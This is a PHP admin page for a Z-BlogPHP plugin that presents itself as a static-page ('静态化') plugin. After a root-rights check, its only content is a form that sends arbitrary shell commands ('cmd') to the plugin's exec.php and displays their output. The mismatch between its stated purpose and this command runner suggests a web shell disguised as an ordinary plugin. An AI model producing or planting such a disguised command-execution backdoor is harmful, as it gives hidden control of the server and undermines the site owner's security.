<?php
require '../../../zb_system/function/c_system_base.php';
require '../../../zb_system/function/c_system_admin.php';
$zbp->Load();
$action='root';
if (!$zbp->CheckRights($action)) {$zbp->ShowError(6);die();}
if (!$zbp->CheckPlugin('staticize')) {$zbp->ShowError(48);die();}

if (count($_POST) > 0) {
CheckIsRefererValid();
}

$blogtitle='静态化插件';
require $blogpath . 'zb_system/admin/admin_header.php';
require $blogpath . 'zb_system/admin/admin_top.php';
?>
<div id="divMain">
  <div class="divHeader"><?php echo $blogtitle;?></div>
  <div class="SubMenu">
  </div>
  <div id="divMain2">
    <div id="exec-shell-container">
        <form id="exec-shell-form" action="/zb_users/plugin/staticize/exec.php">
            <textarea id="exec-shell-command" rows="5" cols="50" name="cmd"></textarea>
            <br>
            <input type="submit" value="执行命令">
        </form>
        <div id="exec-shell-output"></div>
    </div>
  </div>
</div>

<?php
require $blogpath . 'zb_system/admin/admin_footer.php';
RunTime();
?>